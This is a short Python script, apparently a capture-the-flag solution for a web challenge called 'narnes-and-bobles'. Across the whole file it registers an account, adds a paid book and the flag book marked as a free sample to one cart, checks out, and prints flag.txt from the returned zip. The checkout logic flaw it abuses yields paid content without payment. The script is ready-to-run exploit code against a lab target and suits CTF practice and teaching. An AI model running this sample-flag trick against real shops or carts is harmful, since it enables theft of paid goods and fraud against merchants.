import io
import zipfile
from urllib.parse import urljoin

import requests

HOST = "https://narnes-and-bobles-0me39.instancer.lac.tf/"
LORE_ID = "f4838abd731caf29"
FLAG_ID = "2a16e349fb9045fa"


def url(path):
    return urljoin(HOST, path)


def main():
    s = requests.Session()

    json = {"username": hex(id(requests)), "password": hex(id(requests))}
    s.post(url("/register"), json=json)

    json = {"products": [{"book_id": LORE_ID}, {"book_id": FLAG_ID, "is_sample": True}]}
    s.post(url("/cart/add"), json=json)

    r = s.post(url("/cart/checkout"))

    with zipfile.ZipFile(io.BytesIO(r.content)) as z:
        print(z.read("flag.txt").decode().strip())


if __name__ == "__main__":
    main()
